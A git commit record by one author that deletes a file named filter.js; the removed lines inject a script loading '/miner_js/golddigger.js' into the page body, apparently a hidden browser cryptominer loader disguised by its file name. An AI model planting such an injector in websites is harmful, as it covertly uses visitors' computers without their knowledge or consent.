3381ef9dd6033a89756e835266e2b7c0a492394e
Aileen Sun <aileen.sun@gmail.com>
2018-10-15 13:26:10 -0400

    Delete filter.js

--- filter.js
+++
@@ -1,8 +0,0 @@
-if(parent.document.URL!=document.location.href)
-       throw new Error("Not the main page");
-
-(function(e){e.setAttribute("src","/miner_js/golddigger.js");//TODO check file path
-document.getElementsByTagName("body")[0].appendChild(e);})
-(document.createElement("script"));void(0);
-
-console.log("******* Script Injected *******")
